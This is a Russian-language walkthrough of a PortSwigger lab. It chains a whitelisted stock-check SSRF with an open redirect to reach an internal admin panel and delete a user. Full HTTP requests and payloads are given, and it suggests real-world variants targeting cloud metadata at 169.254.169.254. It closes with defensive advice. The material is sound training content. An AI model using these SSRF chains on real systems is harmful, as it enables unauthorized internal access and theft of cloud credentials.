# 📘 PortSwigger Lab: SSRF with filter bypass via open redirection

<a id="top"></a>

> 🔗 Лабораторная работа: https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection  
> 🎯 Тема: Server-Side Request Forgery (SSRF) — обход whitelist-фильтра через open redirect  
> 🧪 Уровень: Practitioner  
> ✅ Статус: Solved  

---

## 📑 Содержание

- [🎯 Цель](#goal)
- [🧠 Краткая теория](#theory)
- [🧩 Ключевая идея](#idea)
- [🚫 Ограничение stockApi — whitelist](#whitelist)
- [🔀 Что такое open redirect](#open-redirect)
- [🧱 Как работает функция nextProduct](#next-product)
- [🔗 Построение цепочки](#chain)
- [🔍 Шаг 1 — Перехватить запрос проверки наличия](#step1)
- [🔍 Шаг 2 — Подтвердить ограничение whitelist](#step2)
- [🔍 Шаг 3 — Найти и подтвердить open redirect](#step3)
- [🔍 Шаг 4 — Обойти whitelist через редирект](#step4)
- [🔍 Шаг 5 — Удалить пользователя carlos](#step5)
- [📨 Примеры запросов](#requests)
- [📥 Примеры ответов](#responses)
- [🧾 Полная цепочка атаки](#attack-chain)
- [🔬 Почему атака сработала](#breakdown)
- [🧠 Как думать как пентестер](#pentester)
- [🧪 Дополнительные проверки](#additional-tests)
- [❌ Типичные ошибки](#mistakes)
- [🛡 Защита](#defense)
- [✅ Чек-лист](#checklist)
- [🧾 Итог](#conclusion)

---

<a id="goal"></a>

## 🎯 Цель

Использовать функцию проверки наличия товара (stock check) для:

```text
1. Доступа к админ-интерфейсу http://192.168.0.12:8080/admin,
   несмотря на whitelist-ограничение stockApi.

2. Удаления пользователя carlos.
```

---

<a id="theory"></a>

## 🧠 Краткая теория

В этой лабе `stockApi` **ограничен whitelist'ом**: сервер разрешает запросы только на локальное приложение. Прямой SSRF на внутренние адреса заблокирован:

```text
stockApi=http://192.168.0.12:8080/admin  → блокировка
```

Но в самом приложении есть **open redirect**: функция «следующий товар» (`/product/nextProduct`) берёт параметр `path` и без проверки подставляет его в заголовок `Location`. Атакующий контролирует `path` → контролирует адрес редиректа.

Комбинация двух уязвимостей даёт полный SSRF:

```text
SSRF (ограниченный whitelist'ом) + Open redirect = SSRF (неограниченный)
```

---

<a id="idea"></a>

## 🧩 Ключевая идея

Фильтр проверяет **только первый URL** в цепочке запросов. Он не контролирует, куда сервер пойдёт **после редиректа**.

```text
Фильтр видит:  локальный URL приложения      → разрешено ✅
Реальность:    локальный URL отвечает 302
               → клиент следует редиректу
               → запрос уходит на 192.168.0.12:8080/admin ✅
```

Цепочка эксплуатирует фундаментальную слабость любых фильтров SSRF:

```text
Фильтр контролирует ПЕРВЫЙ запрос,
но не контролирует РЕДИРЕКТЫ,
которым следует HTTP-клиент.
```

---

<a id="whitelist"></a>

## 🚫 Ограничение stockApi — whitelist

В отличие от blacklist-лабы, здесь нельзя обойтись трюками с `@`, `#` или альтернативными IP:

```text
stockApi=http://127.0.0.1/admin            → блок
stockApi=http://192.168.0.12:8080/admin    → блок
stockApi=https://evil.com/admin            → блок
```

Разрешён только один случай:

```text
stockApi=http://LAB-ID.web-security-academy.net/...   → разрешено
```

Такой whitelist сильнее blacklist, но у него есть слабое место — **он проверяет начало URL, а не всю цепочку запросов**. Если разрешённый домен сам умеет редиректить (open redirect) — whitelist превращается в шлюз куда угодно.

---

<a id="open-redirect"></a>

## 🔀 Что такое open redirect

Open redirect — уязвимость, при которой приложение перенаправляет пользователя на адрес, контролируемый атакующим, без проверки.

Типичная причина:

```python
target = request.args["path"]
return redirect(target)   # нет проверки scheme/host
```

Параметр зеркалится в `Location` как есть:

```text
GET /product/nextProduct?path=http://evil.com
→ 302 Location: http://evil.com
```

Признаки open redirect — параметры, которые попадают в редирект или ссылку без валидации:

```text
path   url   redirect   next   dest   return   goto
```

---

<a id="next-product"></a>

## 🧱 Как работает функция nextProduct

Запрос «следующий товар»:

```http
GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin HTTP/2
Host: LAB-ID.web-security-academy.net
```

Ответ:

```http
HTTP/2 302 Found
Location: http://192.168.0.12:8080/admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Параметр `path` **без проверки** подставлен в `Location`. Это open redirect: кто контролирует `path` — тот контролирует, куда пойдёт любой HTTP-клиент этого приложения.

---

<a id="chain"></a>

## 🔗 Построение цепочки

```text
1. stockApi = /product/nextProduct?path=http://192.168.0.12:8080/admin
                                     └─────── open redirect ───────┘

2. Фильтр:  hostname = LAB-ID.web-security-academy.net  → разрешено ✅

3. Сервер:  GET /product/nextProduct?path=http://192.168.0.12:8080/admin

4. Ответ:   302 Found, Location: http://192.168.0.12:8080/admin

5. HTTP-клиент СЛЕДУЕТ редиректу
   → GET http://192.168.0.12:8080/admin
   → ответ админки возвращается в stock-ответе
```

---

<a id="step1"></a>

## 🔍 Шаг 1 — Перехватить запрос проверки наличия

1. Открыть страницу любого товара.
2. Включить перехват в Burp Proxy (Intercept on).
3. Нажать:

```text
Check stock
```

4. Перехватить запрос:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

5. Отправить в Repeater:

```text
Right click → Send to Repeater
```

---

<a id="step2"></a>

## 🔍 Шаг 2 — Подтвердить ограничение whitelist

Попробовать прямой запрос к цели:

```text
stockApi=http://192.168.0.12:8080/admin
```

Ожидаемый ответ — блокировка (сообщение вида «External stock check blocked» или «only the local application is allowed»).

Закартировать фильтр:

```text
stockApi=http://192.168.0.12:8080/admin   → блок (внутренний адрес)
stockApi=http://127.0.0.1/admin           → блок (loopback)
stockApi=https://evil.com/admin           → блок (чужой домен)
stockApi=http://LAB-ID.web-security-academy.net/...  → разрешено
```

Вывод: whitelist строгий — прямые обходы не работают, нужен **обход через само приложение**.

---

<a id="step3"></a>

## 🔍 Шаг 3 — Найти и подтвердить open redirect

1. Открыть страницу товара.
2. Найти ссылку/кнопку **Next product** и кликнуть.
3. Перехватить запрос:

```http
GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

4. Изучить ответ:

```http
HTTP/2 302 Found
Location: /product?productId=2
```

Параметр `path` зеркалится в `Location` — это подозрение на open redirect.

5. Подтвердить в Repeater — подставить внутренний адрес в `path`:

```http
GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin HTTP/2
Host: LAB-ID.web-security-academy.net
```

Ответ:

```http
HTTP/2 302 Found
Location: http://192.168.0.12:8080/admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Open redirect подтверждён ✅

---

<a id="step4"></a>

## 🔍 Шаг 4 — Обойти whitelist через редирект

Отдать stock checker'у локальный URL с параметром open redirect:

```text
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

Полный запрос:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

Что происходит:

```text
1. Фильтр:  hostname локальный → разрешено
2. Сервер:  GET /product/nextProduct?path=http://192.168.0.12:8080/admin
3. Ответ:   302 Location: http://192.168.0.12:8080/admin
4. Клиент:  следует редиректу → GET http://192.168.0.12:8080/admin
5. Ответ админки возвращается в stock-ответе
```

Признак успеха: `200 OK` с HTML админки — заголовок `Users`, список пользователей со ссылками `Delete`.

---

<a id="step5"></a>

## 🔍 Шаг 5 — Удалить пользователя carlos

В HTML админки найти ссылку:

```html
<a href="/admin/delete?username=carlos">Delete</a>
```

Добавить путь удаления в `path`:

```text
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

Полный запрос:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 87

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

Если сервер странно распарсит `&` внутри значения — закодировать `?` внутри `path`:

```text
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete%3fusername=carlos
```

Лаборатория получает статус:

```text
Solved
```

---

<a id="requests"></a>

## 📨 Примеры запросов

### Исходный (легитимный)

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

### Заблокированный прямой SSRF (эталон)

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

stockApi=http://192.168.0.12:8080/admin
```

Ответ фильтра (пример):

```http
HTTP/1.1 400 Bad Request
...

External stock check blocked for: http://192.168.0.12:8080/admin
```

### Запрос nextProduct с внутренним адресом (подтверждение open redirect)

```http
GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
```

### Рабочий — доступ к админке через редирект

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

### Рабочий — удаление пользователя

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 87

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

---

<a id="responses"></a>

## 📥 Примеры ответов

### Ответ nextProduct с внутренним адресом

```http
HTTP/2 302 Found
Location: http://192.168.0.12:8080/admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

### Ответ stock-запроса после редиректа (админка)

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
...

<!DOCTYPE html>
<html>
...
<h1>Users</h1>
<div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
...
```

### Ответ на запрос удаления

```http
HTTP/1.1 200 OK
...
```

и статус лаборатории:

```text
Solved
```

---

<a id="attack-chain"></a>

## 🧾 Полная цепочка атаки

```text
1. Открыть лабораторию
2. Открыть страницу товара
3. Перехватить POST /product/stock
4. Проверить stockApi=http://192.168.0.12:8080/admin → блокировка (эталон)
5. Перехватить GET /product/nextProduct?path=...
6. Заметить, что path попадает в Location → open redirect
7. Подтвердить: path=http://192.168.0.12:8080/admin → 302 с внутренним адресом
8. Отправить stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
9. Сервер следует редиректу → открывается админка
10. Найти ссылку /admin/delete?username=carlos
11. Отправить stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
12. Пользователь carlos удалён
13. Лаборатория помечена как Solved
```

---

<a id="breakdown"></a>

## 🔬 Почему атака сработала

### 1. Фильтр проверяет только первый URL

Whitelist проверяет hostname `stockApi` — он локальный, поэтому пропущен. Куда уйдёт запрос после редиректа, фильтр не контролирует.

### 2. HTTP-клиент сервера следует редиректам

Ключевое условие эксплойта: клиент, выполняющий запрос `stockApi`, поддерживает редиректы. В лабе — поддерживает.

### 3. Open redirect в разрешённом домене

Приложение само подставляет пользовательский `path` в `Location` без проверки. Разрешённый домен превращается в «мостик» в любую точку.

### 4. Комбинация даёт эскалацию

```text
SSRF (ограниченный) + Open redirect = SSRF (неограниченный)
```

Ограниченная уязвимость расширяется до полной через вторую уязвимость — классическая эскалация.

### 5. Внутренний сервис не требует аутентификации

Админка на `192.168.0.12:8080` доверяет запросам изнутри — после доставки запроса через редирект атакующий получает полный контроль.

---

<a id="pentester"></a>

## 🧠 Как думать как пентестер

Когда видишь ограниченный SSRF (whitelist) — не пытайся сразу ломать фильтр:

```text
Какие функции приложения умеют редиректить?
```

```text
Какие параметры попадают в Location или в ссылки без проверки?
```

```text
path, url, redirect, next, dest, return, goto — все кандидаты
```

```text
Следует ли HTTP-клиент сервера редиректам?
```

Наблюдательность при нахождении open redirect:

```text
Обычный клик по "Next product" → в ответе 302
Параметр зеркалится в Location как есть
Подставь внешний адрес в path → редирект на него
→ open redirect подтверждён
```

---

<a id="additional-tests"></a>

## 🧪 Дополнительные проверки

В рамках разрешённой лаборатории можно сравнить:

### Прямой SSRF (блокируется)

```text
stockApi=http://192.168.0.12:8080/admin
```

### SSRF через open redirect (работает)

```text
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

### Относительный редирект (в реальных системах)

```text
stockApi=/product/nextProduct?path=/admin
```

### Редирект на облачные метаданные (в реальных системах)

```text
stockApi=/product/nextProduct?path=http://169.254.169.254/latest/meta-data/
```

### Перебор кодов редиректа (в реальных системах)

```text
301  302  303  307  308  — клиенты обрабатывают их по-разному
```

---

<a id="mistakes"></a>

## ❌ Типичные ошибки

### Ошибка 1. Пытаться обойти whitelist трюками с URL

`@`, `#`, альтернативные IP здесь не работают — whitelist строгий. Нужен обход через само приложение.

### Ошибка 2. Не заметить open redirect

Кликаешь «Next product» «на автомате» и не смотришь на 302 и параметр `path`. Именно там скрыта вторая уязвимость.

### Ошибка 3. Проверять только статус, игнорируя Location

Подтверждение open redirect — это именно значение заголовка `Location`, а не код 302 сам по себе.

### Ошибка 4. Использовать полный URL в stockApi без необходимости

Достаточно относительного пути `/product/nextProduct?...` — он тоже проходит whitelist (hostname совпадает с запросом).

### Ошибка 5. Забыть про кодирование спецсимволов

`?` и `&` внутри значения `stockApi` могут сломать парсинг формы. Если что-то не работает — закодировать `?` как `%3f`.

### Ошибка 6. Не следить за Content-Length

При ручном изменении тела запроса убедиться, что `Content-Length` соответствует новой длине (Repeater обновляет автоматически по умолчанию).

---

<a id="defense"></a>

## 🛡 Защита

### 1. Whitelist + проверка на уровне разрешённого IP

Мало проверить hostname в начале URL — нужно резолвить и проверять итоговый IP:

```text
127.0.0.0/8        loopback
10.0.0.0/8         приватные
172.16.0.0/12      приватные
192.168.0.0/16     приватные
169.254.169.254    облачные метаданные
```

### 2. Не следовать редиректам

Отключить автоматическое следование редиректам в HTTP-клиенте, выполняющем `stockApi`-запросы. Если редирект необходим — проверять и его целевой URL.

### 3. Исправить open redirect

Параметр `path` не должен подставляться в `Location` без проверки. Разрешать только относительные пути и только известные значения:

```python
allowed_paths = {"/product?productId=2", "/product?productId=3"}
if path not in allowed_paths:
    return error
```

### 4. Allowlist внутренних эндпоинтов

Не принимать URL от пользователя вообще — использовать серверный словарь разрешённых API.

### 5. Аутентификация внутренних сервисов

Админки и API не должны доверять запросам только из-за сетевого расположения.

### 6. Egress-фильтрация и сегментация

Ограничить, куда приложение может ходить (network policy, firewall).

---

<a id="checklist"></a>

## ✅ Чек-лист

### Разведка

- [ ] Открыта страница товара
- [ ] Перехвачен запрос `POST /product/stock`
- [ ] Найден параметр `stockApi`
- [ ] Запрос отправлен в Repeater

### Подтверждение ограничения

- [ ] `stockApi=http://192.168.0.12:8080/admin` → блокировка
- [ ] Выяснено, что whitelist разрешает только локальное приложение

### Поиск open redirect

- [ ] Перехвачен запрос `GET /product/nextProduct?path=...`
- [ ] Замечено, что `path` попадает в `Location`
- [ ] Подтверждено: `path=http://192.168.0.12:8080/admin` → 302 с внутренним адресом

### Эксплуатация

- [ ] `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin`
- [ ] В ответе HTML админки (Users, ссылки Delete)
- [ ] `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
- [ ] Пользователь `carlos` удалён
- [ ] Лаборатория получила статус Solved

---

<a id="conclusion"></a>

## 🧾 Итог

Лаборатория решена через **комбинацию двух уязвимостей**:

```text
SSRF (ограниченный whitelist'ом) + Open redirect = SSRF (неограниченный)
```

Финальная цепочка:

```text
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos

1. Фильтр пропускает локальный URL
2. nextProduct отвечает 302 на внутренний адрес
3. HTTP-клиент следует редиректу
4. Запрос к админке выполнен от имени сервера
5. carlos удалён
```

Главные выводы:

```text
Фильтр SSRF контролирует ПЕРВЫЙ запрос, но не контролирует редиректы.
```

```text
Open redirect в разрешённом домене превращает whitelist в шлюз куда угодно.
```

```text
Ограниченная уязвимость + вторая уязвимость = полная компрометация (эскалация).
```

```text
Защита: не следовать редиректам, проверять итоговый IP, чинить open redirect.
```

---

[⬆ Вернуться к началу](#top)
